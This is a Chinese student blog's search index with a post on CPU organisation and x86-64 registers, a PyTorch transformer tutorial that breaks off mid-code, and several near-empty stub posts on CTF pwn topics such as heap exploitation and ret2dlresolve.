<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>nonsense</title>
    <link href="/2026/02/21/nonsense/"/>
    <url>/2026/02/21/nonsense/</url>
    
    <content type="html"><![CDATA[<p>ok啊兄弟们晚上好</p><p>今天也是实在无聊简单了解了一下<code>计算机组成原理</code>，不过也有一些好奇心的因素在就是了</p><p>但是其中具体电路的实现我实在是看不懂，电学本来就没学好，遂放弃理解电路实际组成，只关注抽象的过程，也因此不得不赞叹<strong>抽象</strong>的力量，使得我们不用过多关注于这些复杂的实现!</p><p>取名为nonsense，也算是一种自嘲吧!</p><p>开始吧!</p><hr><p>你有没有想过，你写的c语言程序计算机是怎么运行的?</p><p>根据panorama这篇(其实我还没写完qwq)，可以得知c代码经过<strong>编译器</strong>变为汇编代码，再经过<code>汇编器</code>转化为机器语言，也就是CPU能直接理解的二进制指令，接着，<strong>链接器</strong>把目标文件和<code>共享库</code>整合成一个完整的可执行文件</p><p>当你决定要运行它，这个可执行文件会通过操作系统从<code>硬盘</code>加载到主存(<code>RAM</code>)中，CPU的程序计数器(PC&#x2F;IP)会指向机器代码的起始地址，然后开始一条条执行:取指、译码、执行，再取下一条，循环往复…</p><p>但是等等，二进制指令计算机这个<strong>福瑞</strong>又是怎么看懂的?</p><hr><p>再深入一点吧</p><p>从<code>晶体管</code>开始</p><p>晶体管简单来说可以理解为一个微型开关，只有两种状态:通电即为1，断电即为0</p><p>单个晶体管虽然简单，但可以通过电路组合成<strong>逻辑门</strong>:与门(串联)、或门(并联)、非门和异或门(复杂的电路组合,我反正懵了)</p><p><code>与门</code>是两个输入都为1输出才为1，<code>或门</code>是任意一个输入为1输出就为1，<code>非门</code>则是输入取反，<code>异或门</code>是两个输入不同时输出1，相同则输出0，也就是c语言学过的<strong>位运算</strong>，很好理解</p><p>这些逻辑门就是数字电路的语言，所有后续的计算都建立在它们之上</p><p>直觉来看这些逻辑门似乎能做的事情很有限，但并非如此，我们继续抽象</p><p>先来看看加法是如何实现的，先考虑两位二进制的加法，只需要考虑<code>和</code>和<code>进位</code></p><p>和可以抽象为</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> -&gt; <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> -&gt; <span class="hljs-number">0</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">0</span> -&gt; <span class="hljs-number">1</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> -&gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>是不是就是一个<code>异或门</code>便能处理</p><p>再考虑进位</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">1</span> -&gt; <span class="hljs-number">1</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> -&gt; <span class="hljs-number">0</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> -&gt; <span class="hljs-number">0</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">0</span> -&gt; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>这个也简单，就是<code>与门</code>吧</p><p>恭喜你，发明了<strong>半加器</strong>!</p><hr><p>然而两位能表示的信息还是太有限了，在真实多位计算中，单个半加器无法处理来自低位的进位，于是我们引入<strong>全加器</strong>!</p><p>全加器在半加器的基础上，额外考虑了前一位的进位，我们进一步抽象，当多个全加器首尾相连时，就可以构成8位，32位甚至64位的多位加法器</p><p>具体电路的实现请原谅我直接忽略了，若好奇请自行查阅资料~</p><p>当然也要考虑最高位的进位，这便是后面标志位寄存器的工作了~</p><p>众所周知，实现了加法，便也实现了减法，减法本质上就是<strong>补码</strong>加法，即</p><p><code>A − B &lt;=&gt; A + (~B + 1)</code></p><p>左右移位操作在电路中是很简单基础的逻辑，但是在数学上，左移一位，就相当于乘以2；右移一位，就相当于除以2</p><p>于是通过移位和加减操作的结合，又能分别实现乘法和除法</p><p>加、减、乘、除、与、或、异或、移位，这些在高级语言里看起来完全不同的操作，在硬件里竟然都可以归结为对少数几种基础电路的组合和控制，太神秘了</p><p>最后，这些运算电路被统一封装在一个模块中，这个模块就是<strong>ALU</strong>，即<code>算数逻辑单元</code>~</p><p>不得不再次提到<code>抽象</code>的力量，你可以不用关注复杂的晶体管与电路实现，只需要封装+抽象即可!</p><hr><p>现在计算机拥有了<code>运算</code>的能力，但如何获得<strong>记住</strong>的能力?</p><p>很容易想到，<strong>电容</strong>可以实现记住的功能，但电容会随时间逐渐损失(<strong>漏电</strong>)，因此需要不断刷新来保持数据，用在CPU中似乎并不合适，CPU的运算节奏极快，它需要的是一种几乎可以<code>随取随用</code>的存储单元，而不是隔一段时间就要维护一次状态的电容，但其结构简单，容量大且成本低，因此主存便通常采取这样的方式，也就是<strong>DRAM</strong>，<code>动态随机存取存储器</code></p><p>区别于此，CPU中通过晶体管电路的精妙实现，组成一个带<code>反馈</code>的逻辑结构，把输出重新送回输入，构成一个稳定的逻辑状态，一旦被写入0或1，只要电源存在，它就能一直保持这个值不变，这便是<code>SRAM</code>，<code>静态随机存取存储器</code>，常用于CPU<strong>寄存器</strong>与L1，L2<strong>缓存</strong>，需要更多的晶体管，成本更高，更复杂，容量也做不大，但换来的，是极高的速度和稳定性，称为<strong>锁存器</strong>(latch)!</p><p>同理，多个锁存器组合起来便是喜闻乐见的<code>寄存器</code>了~</p><p>寄存器用于在CPU内部保存当前指令执行过程中最关键，最频繁访问的数据</p><p>相比主存，寄存器容量极小，但访问速度极快!</p><p>为了让寄存器在复杂的电路中正常工作，还需要配合<code>读使能</code>和<code>写使能</code>信号，写使能决定当前时钟边沿是否把数据写入寄存器，读使能则决定寄存器的内容是否被送上数据总线，这些信号由控制单元统一调度!</p><p>出现了许多概念</p><p>先解释一下<strong>时钟</strong></p><p>时钟是一个周期性跳变的信号，CPU内部几乎所有状态的更新，都严格发生在时钟的某一个边沿上，这里的状态，指的就是寄存器，程序计数器，标志位等由锁存器构成的存储单元，组合逻辑可以在一个周期内自由变化，但只有在时钟边沿到来时，这些变化才会被采样并真正写入寄存器</p><p><code>数据总线</code>则可以理解为将ALU，寄存器，主存<strong>串联</strong>起来的传输数据的共享线路，除此之外还有<code>地址总线</code>，用来告诉主存我要访问的是哪个位置，以及<code>控制总线</code>，用来传递读写使能，时钟相关信号等控制信息…</p><p>等等，CPU是怎么在主存中找到地址的?</p><p>从CPU的视角来看，主存被抽象为一个巨大的，线性编号的存储空间，每一个存储单元都有一个唯一的地址，CPU只需要给出一个地址，就能通过地址总线访问对应的位置，但是主存是将地址解码成行，列等更底层的电路结构，用来选中具体的存储单元，太复杂的实现，我们抽象掉…</p><p>CPU又是怎么识别如<code>add</code>，<code>mov</code>等指令的呢，CPU并不理解<code>add</code>，<code>mov</code>这样的助记符，这些只是汇编语言中为了方便人类阅读而引入的名字，尽管似乎对于人类来说还是很难理解(x_x)，在机器层面，指令就是一串固定格式的二进制比特</p><p>这似乎取决于具体架构，但离不开<strong>译码器</strong>，当一条指令被从主存取到CPU后，它会被送入指令寄存器(即<strong>取指</strong>)，随后，控制单元开始对这串比特进行解析，即<strong>译码</strong></p><p>译码的核心是<code>译码器</code>，译码器本质上也是一个组合逻辑电路，它根据指令中不同字段的比特模式，产生一组控制信号，这些控制信号会告诉 CPU这是哪一类指令，需要使用哪些寄存器，ALU要执行什么运算以及结果是否需要写回寄存器或内存等等</p><p>在<strong>执行</strong>阶段，这些控制信号会被真正送达各个<strong>硬件</strong>模块，相关寄存器的读使能被打开，操作数被送上数据总线，ALU根据译码结果选择对应的运算路径，若需要访问主存，相应的地址和读写信号也会被同时发出</p><p>当运算完成后，在下一个<strong>时钟</strong>边沿，如果写使能信号有效，结果就会被写回到目标寄存器或内存中，与此同时，程序计数器也会根据指令类型被更新，要么顺序指向下一条指令，要么被改写为跳转目标地址</p><p>至此，一条指令的<strong>生命周期</strong>才算结束!</p><p>随后，CPU再次进入取指阶段，重复取指、译码、执行这一循环，程序也就以这种方式一条一条地向前推进…</p><p>让我们重点看看<strong>程序计数器</strong>(IP&#x2F;PC)，其始终指向<code>当前即将执行的那一条指令在主存中的地址</code></p><p>在取指阶段，CPU会根据IP给出的地址，通过地址总线从主存中取出对应的指令，并送入<strong>指令寄存器</strong>(IR)</p><p>当一条指令执行完成后，IP会被更新，对于顺序执行的指令，IP 通常会自动增加，指向下一条指令的位置，而对于跳转(jmp)，调用(call)等控制流指令，IP则会被直接改写为新的目标地址</p><p>也正是通过不断地读取和更新IP，CPU才能沿着程序设定的执行路径不断向前推进，看似只是一个简单的寄存器，却决定了程序接下来要做什么，是整个指令执行流程中最关键的状态之一!</p><p>所以在<code>pwn</code>中，hacker们的目标通常就是控制IP~</p><p>原来如此啊~</p><p>当然，这似乎只是最简单的实现，尽管其已经让我彻底懵了</p><p>在更复杂的CPU中，这些阶段甚至会被流水线化(x_x)，不同指令的不同阶段可以在同一个时钟周期内<strong>并行</strong>进行，后面再来探索吧!</p><p class="note note-primary">想不到吧，这里也有资本家</p><p>同时，如你所见，由于频繁访问主存会带来较大的延迟和性能开销，现代CPU内部会集成高速<strong>缓存</strong>(Cache)系统，从而减少每次访问主存的等待时间，提高CPU整体运行效率</p><p>寄存器，操作系统，汇编指令似乎也不止于此…</p><p>太神秘了…</p><hr><p>最后总结一下!</p><p>在CPU内部，最核心的组成包括几部分</p><p>首先是<code>运算逻辑单元</code>，即<strong>ALU</strong>，负责执行加减、逻辑运算和移位等基本计算</p><p>其次是<code>寄存器系统</code>，由大量基于<strong>锁存器</strong>构成的寄存器组成，用来保存指令执行过程中最关键、最频繁使用的数据，其中也包括程序计数器<strong>IP</strong>，用来指向下一条即将执行的指令</p><p>为了让这些部件在高速下仍然能够有序协作，CPU还依赖统一的<code>时钟信号</code></p><p>时钟把连续变化的电路切分成一个个离散的周期，使寄存器只在特定的时刻更新状态，保证整个系统的确定性</p><p>而控制单元则通过<code>译码器</code>，把指令中的二进制比特翻译成一组控制信号，统一调度寄存器读写，ALU运算以及访存行为</p><p>在存储层面，CPU内部使用的是基于<strong>SRAM</strong>的寄存器和高速缓存，追求极致的访问速度</p><p>而主存则采用<strong>DRAM</strong>，负责提供大容量的数据存储</p><p>两者之间通过<code>总线</code>相连，形成清晰的分工</p><p>当CPU需要与主存交互时，会由IP给出指令地址，或由指令本身给出数据地址</p><p>CPU将目标地址放到<code>地址总线</code>上，同时通过控制总线发出读或写信号</p><p>主存在接收到地址和控制信号后，把对应的数据放到数据总线上，CPU 再将这些数据读入寄存器，供后续运算使用，或将计算结果写回主存</p><p>最终，CPU 正是通过不断重复<code>取指</code>、<code>译码</code>、<code>执行</code>这一循环，在<code>时钟</code>的约束下，对寄存器和主存中的状态进行有序更新</p><p>看似抽象复杂的程序执行过程，本质上就是这些基础部件在硬件层面一次次精确协作的结果!</p><div class="note note-success">            <p>最后 借用YS-os中的一句话 — 善用 LLM 进行学习! (´・ω・)つ旦</p>           </div><hr><p>so free~</p><p>最后的最后依旧借用一下2022年上海中考的作文题目，这不过是个开始…</p><p>move forward!</p><p>感谢阅读!</p><p>生活愉快…</p><hr><p>补充:</p><p>我觉得有必要补充一下<code>寄存器</code>相关的知识</p><p>掌握了寄存器</p><p>汇编便也不再晦涩难懂(你确定??? (´⊙ω⊙&#96;) )</p><p>我以我熟悉的linux x86-64 为例</p><p>首先，有哪些寄存器?</p><p>1.通用寄存器</p><p>比如</p><p><code>rdi rsi rdx rcx rbx rax r8-r15</code></p><p>用于整数运算，函数参数传递，临时存储等</p><p>2.栈相关寄存器</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rbp</span> 栈帧基址寄存器<br><span class="hljs-built_in">rsp</span> 栈顶指针寄存器<br></code></pre></td></tr></table></figure><p><strong>栈帧</strong></p><p>3.程序计数器</p><p><code>rip</code></p><p>保存下一条即将执行的指令地址</p><p>4.标志寄存器(<code>RFLAGS</code>&#x2F;<code>EFLAGS</code>)</p><p>保存运算结果状态，例如零标志<code>ZF</code>，进位标志<code>CF</code>，溢出标志<code>OF</code>，符号标志<code>SF</code>等等，用于<strong>条件跳转</strong>和ALU决策</p><p>5.浮点与向量寄存器</p><p>涉及二进制浮点数表示，暂时不管</p><p>6.段寄存器</p><p><code>CS DS ES FS GS SS</code></p><p>用于<code>内存段选择</code>，现代用户态程序基本不操作，不管</p><p>7.控制寄存器(CR0–CR4等)</p><p>用于控制CPU工作模式，分页，保护等机制，主要在内核态使用</p><p>8.调试寄存器(DR0–DR7)</p><p>用于硬件断点设置(硬件中断)，gdb的底层原理!</p><p>最后，是一套寄存器调用约定(ABI)</p><ul><li><p>函数前6个整型参数依次放在寄存器 RDI RSI RDX RCX R8 R9</p></li><li><p>caller-saved <code>RAX RCX RDX RSI RDI R8–R11</code></p></li><li><p>callee-saved <code>RBX RBP R12–R15</code></p></li><li><p>返回值放在寄存器 <strong>RAX</strong></p></li><li><p>栈16字节对齐(<strong>RSP</strong>)</p></li></ul><p>熟悉吗孩子们</p><p>哈哈哈哈哈哈哈</p><div class="note note-danger">            <p>pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn pwn</p>           </div>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPU</tag>
      
      <tag>计组</tag>
      
      <tag>抽象</tag>
      
      <tag>内存</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>first heap!!!!!</title>
    <link href="/2026/02/11/first-heap/"/>
    <url>/2026/02/11/first-heap/</url>
    
    <content type="html"><![CDATA[<p>做的第一道堆题</p><p>暂时不知道打什么标签呢</p><p>好混乱…</p><p>慢慢写…</p>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>堆</tag>
      
      <tag>freehook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>heap</title>
    <link href="/2026/02/11/heap/"/>
    <url>/2026/02/11/heap/</url>
    
    <content type="html"><![CDATA[<p>此heap非彼heap</p><p>终于开始堆漏洞的学习了</p><p>这篇作为前置知识的总结</p><p>一直放着…</p><p>慢慢写…</p>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>magic-gadget</title>
    <link href="/2026/02/11/magic-gadget/"/>
    <url>/2026/02/11/magic-gadget/</url>
    
    <content type="html"><![CDATA[<p>今天偶然看到的一个很神奇的gadget和攻击方法</p><p>令我很震惊</p><p>原来不是<code>pop ***; ret;</code>这样式才叫gadget</p><p>只要能被我们所利用</p><p>那其就能被称之为gadget</p><p>不得不佩服古人的智慧</p><p>同时对partial overwrite这门技术有了新的理解</p><p>很多时候不能或者说很难泄露libc基址</p><p>便可以利用程序中已存在的libc中的地址进行partial overwrite</p><p>此时</p><p><code>偏移</code> is all you need</p><p>虽然比赛(<code>SHCTF</code>)时一题也没做出来…</p><p>但自认收获还是很丰厚的</p><p>在不断的调试与改写exp中</p><p>也更加感受到了pwn漏洞利用的魅力</p><p>下面进入正题</p><p>爱来自magic-gadget</p><p>简单复刻了一下</p><p>有点意思…</p><p>以后再写…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>magic-gadget</tag>
      
      <tag>partial overwrite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dlresolve续</title>
    <link href="/2026/02/11/ret2dlresolve%E7%BB%AD/"/>
    <url>/2026/02/11/ret2dlresolve%E7%BB%AD/</url>
    
    <content type="html"><![CDATA[<p>这篇才是真正的攻击与题目</p><p>依旧慢慢写…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2dlresolve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>transformer</title>
    <link href="/2026/01/25/transformer/"/>
    <url>/2026/01/25/transformer/</url>
    
    <content type="html"><![CDATA[<p>最近<strong>大语言模型</strong>(LLM)的各种应用好像都比较火热，我也来凑凑热闹浅浅研究一下<code>AI</code></p><p>虽然被一堆眼花缭乱的词汇弄得有些茫然，不过还是从其最基础的架构开始学习…</p><p>从传统的机器学习，统计学习到如今的强化学习，深度学习，神经网络，包括以<code>CV</code>(computer vision)为起源发展起来的<code>FNN</code>(全连接神经网络)，<code>CNN</code>(卷积神经网络)，<code>RNN</code>(循环神经网络)等等，可以自行了解</p><p>它们虽风靡一时，但仍存在一些问题…</p><p>最主要的便是它们都是依序计算，限制了<code>GPU</code>的<strong>并行</strong>计算能力，且难以捕捉长序列的时序关系，距离越远的输入之间的关系就越难被捕捉</p><p>直到2017年一篇论文横空出世，<code>attention is all you need</code>，引入<code>transformer</code>架构(不是变形金刚qwq)，成为了当今大语言模型的核心架构</p><p>阅读了论文，也看了很多讲解视频，学习了一下基本原理，但仍然感觉比较抽象，所以在<strong>github</strong>的<code>happy-llm</code>这个项目中跟着大佬们手敲一个<code>transformer</code>以加深理解</p><p>原理可以自行阅读论文，看视频，也可以看看<strong>happy-llm</strong>这个project，下面总结一下流程(我也是新手，理解有错勿喷)…</p><p>先放一下这张图</p><p><img src="/images/2.jpg" alt="如图"></p><p>开始吧！</p><p>首先我们假设ai接收到了用户的一串输入，它肯定是看不懂文字的，只能将其转化为数字，但是若一个数字对应一个字，未免太多了，因此通常以<strong>向量</strong>的形式来表示</p><p>具体点，这串输入被<code>tokenizer</code>分为一个个<code>token</code>(最小片段)，并有着各自的<code>token ID</code>，通过查询<strong>词嵌入矩阵</strong>(embedding matrix)，每个token ID会被映射为一个固定维度的向量表示，即<code>token embedding</code>(词嵌入)，这是根据大量数据的训练得来的，此时意思相近的矩阵会在如<code>点积</code>这类相似度计算上表现为相近，例如kobe和bryant相近(开玩笑)，或者经典的like <code>woman - man + king = queen</code> </p><p>代码实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># embedding</span><br><br><span class="hljs-variable language_">self</span>.tok_embeddings = nn.Embedding(args.vocab_size,args.dim)<br></code></pre></td></tr></table></figure><p>此时文字包含了<strong>语义信息</strong>，但是却没有位置信息，我爱你可以被理解为你爱我，但，这可能吗…(说好的幸福呢…)</p><p>好了不扯了，那么因此要加上<strong>位置信息</strong>对吧，采用一种很神秘的形式(<code>PE</code> positional embedding)，跟着数学公式大致推导了一番，理解理解得了</p><p><img src="/images/49.png" alt="如图"></p><p><img src="/images/3.jpg" alt="如图"></p><p>字有点丑，不要介意，证明的也比较抽象(还是去看happy-llm原文吧)，总之这样我们就给token加上了位置信息，而且根据三角函数的一些性质，计算也是比较方便的，可以看到</p><p><img src="/images/50.png" alt="如图"></p><p>效果还是很不错的!</p><p><code>numpy</code>与<code>pytorch</code>的实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 位置编码(PE)</span><br><br><span class="hljs-comment"># 数学原理与证明</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PositionEncoding</span>(<span class="hljs-params">seq_len,d_model,n=<span class="hljs-number">10000</span></span>):<br>    P = np.zeros((seq_len,d_model))<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(seq_len):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> np.arange(<span class="hljs-built_in">int</span>(d_model/<span class="hljs-number">2</span>)):<br>            denominator = np.power(n,<span class="hljs-number">2</span>*i/d_model)<br>            P[k,<span class="hljs-number">2</span>*i] = np.sin(k/denominator)<br>            P[k,<span class="hljs-number">2</span>*i+<span class="hljs-number">1</span>] = np.cos(k/denominator)<br>    <span class="hljs-keyword">return</span> P<br>P = PositionEncoding(seq_len=<span class="hljs-number">4</span>,d_model=<span class="hljs-number">4</span>,n=<span class="hljs-number">100</span>)<br><br><span class="hljs-built_in">print</span>(P)<br><br><span class="hljs-comment"># 位置编码层</span><br><span class="hljs-comment"># pytorch实现</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PositionEncoding</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,args</span>):<br>        <span class="hljs-built_in">super</span>(PositionEncoding,<span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-comment"># Dropout 层</span><br>        <span class="hljs-comment"># self.dropout = nn.Dropout(p=args.dropout)</span><br><br>        <span class="hljs-comment"># block size 是序列的最大长度</span><br>        pe = torch.zeros(args.block_size,args.n_embd)<br>        position = torch.arange(<span class="hljs-number">0</span>,args.block_size).unsqueeze(<span class="hljs-number">1</span>)<br><br>        <span class="hljs-comment"># 计算 theta</span><br>        div_term = torch.exp(<br>            torch.arange(<span class="hljs-number">0</span>,args.n_embd,<span class="hljs-number">2</span>) * -(math.log(<span class="hljs-number">10000.0</span>) / args.n_embd)<br>        )<br><br>        <span class="hljs-comment"># 分别计算 sin、cos 结果</span><br>        pe[:, <span class="hljs-number">0</span>::<span class="hljs-number">2</span>] = torch.sin(position * div_term)<br>        pe[:, <span class="hljs-number">1</span>::<span class="hljs-number">2</span>] = torch.cos(position * div_term)<br>        pe = pe.unsqueeze(<span class="hljs-number">0</span>)<br>        <span class="hljs-variable language_">self</span>.register_buffer(<span class="hljs-string">&quot;pe&quot;</span>,pe)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        <span class="hljs-comment"># 将位置编码加到 Embedding 结果上</span><br>        x = x + <span class="hljs-variable language_">self</span>.pe[:, : x.size(<span class="hljs-number">1</span>)].requires_grad_(<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> x<br></code></pre></td></tr></table></figure><p>此时有了语义信息和位置信息，却没有<strong>上下文信息</strong>，即，词与词之间的关联</p><p>因此接下便是核心部分，<code>attention is all you need</code>，所谓注意力机制，源于这个经典公式</p><p>$$ \text{attention}(Q, K, V) &#x3D; \text{softmax}\left(\frac{QK^T}{\sqrt{d_k}}\right)V $$</p><p>q代表query，k代表key，v代表value</p><p>还是简单解释一下吧，例如，<code>james is crab</code>(随便举个例子)这句句子，被分为token A，B，C，分别是james，is，crab</p><p>每个token都有自己的q，k，v</p><p>crab的q类似于”我(crab)现在需要从上下文中获取什么信息？”</p><p>而每个token的key类似于”我这个token能回答什么问题？”</p><ul><li><p>比如token A，我是一个人名</p></li><li><p>token B，我表示一种判断</p></li></ul><p>v类似”如果你关注我，我真正传递给你的信息”，即，实际被加权汇总的内容</p><p>token C的q与每个token的k相乘(<code>向量点积</code>)，然后为防止数值过大除以dim的平方根，得到一系列<code>logits</code>(分数)，此时，显然<code>james</code>的分数最高，<code>is</code>次之，最后才是<code>crab</code>本身，代表”为了理解crab，我最该关注james”</p><p>最后通过<code>softmax</code>转换为一个和为<strong>1</strong>的概率分布，再用该概率对所有token的v进行加权求和，得到<code>crab</code>的新的包含<strong>上下文信息</strong>的向量表示，类似于”作为james的某种比喻存在的crab”，这样我们就使得crab注意到了james，有了上下文含义，是不是很奇妙</p><p><img src="/images/51.png" alt="如图"></p><p>而每个q,k,v分别由原本的向量与权重矩阵Wq,Wk,Wv相乘得来，这些权重矩阵便是训练的核心，初始先随机，然后根据<code>反向传播</code>，<code>梯度下降</code>不断调整便是，不再赘述…</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 注意力机制实现</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attention</span>(<span class="hljs-params">query, key, value, dropout=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    args:</span><br><span class="hljs-string">    query: 查询值矩阵</span><br><span class="hljs-string">    key: 键值矩阵</span><br><span class="hljs-string">    value: 真值矩阵</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment"># 获取键向量的维度，键向量的维度和值向量的维度相同</span><br>    d_k = query.size(-<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># 计算Q与K的内积并除以根号dk</span><br>    <span class="hljs-comment"># transpose——相当于转置</span><br>    scores = torch.matmul(query, key.transpose(-<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>)) / math.sqrt(d_k)<br>    <span class="hljs-comment"># Softmax</span><br>    p_attn = scores.softmax(dim=-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> dropout <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        p_attn = dropout(p_attn)<br>        <span class="hljs-comment"># 采样</span><br>    <span class="hljs-comment"># 根据计算结果对value进行加权求和</span><br>    <br>    <span class="hljs-keyword">return</span> torch.matmul(p_attn, value), p_attn<br></code></pre></td></tr></table></figure><p>transformer的注意力机制又包括<code>encoder</code>的<strong>自注意力机制</strong>与<code>decoder</code>的<strong>掩码自注意力机制</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自注意力</span><br><span class="hljs-comment"># attention 为上文定义的注意力计算函数</span><br>attention(x, x, x)<br><br><br><span class="hljs-comment"># 掩码自注意力</span><br><span class="hljs-comment"># 创建一个上三角矩阵，用于遮蔽未来信息。</span><br><span class="hljs-comment"># 先通过 full 函数创建一个 1 * seq_len * seq_len 的矩阵</span><br>mask = torch.full((<span class="hljs-number">1</span>,args.max_seq_len,args.max_seq_len), <span class="hljs-built_in">float</span>(<span class="hljs-string">&quot;-inf&quot;</span>))<br><span class="hljs-comment"># triu 函数的功能是创建一个上三角矩阵</span><br>mask = torch.triu(mask, diagonal=<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 此处的 scores 为计算得到的注意力分数，mask 为上文生成的掩码矩阵</span><br>scores = scores + mask[:, :, :seqlen, :seqlen]<br>scores = F.softmax(scores.<span class="hljs-built_in">float</span>(), dim=-<span class="hljs-number">1</span>).type_as(xq)<br></code></pre></td></tr></table></figure><p>自注意力比较好理解，就不解释了，<strong>掩码自注意力机制</strong>可以理解为将矩阵的上三角部分都设置为<code>负无穷</code>，下三角部分均为<code>0</code>，在与注意力分数求和并经过<code>softmax</code>后，上三角部分便变为了0(即被masked)，因此在每一行的输入中，模型都只能看到前一个token，并以此预测下一个token，而且可以<strong>并行</strong>地计算</p><p><img src="/images/47.png" alt="如图"></p><p>但是一次注意力计算只能拟合一种相关关系，单一的注意力机制很难全面拟合语句序列里的相关关系。因此<code>transformer</code>使用了<code>多头注意力机制</code>(Multi-Head Attention)，即同时对一个语料进行多次注意力计算，每次注意力计算都能拟合不同的关系，将最后的多次结果拼接起来作为最后的输出，即可更全面深入地拟合语言信息</p><p><img src="/images/48.png" alt="如图"></p><p>代码实现:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 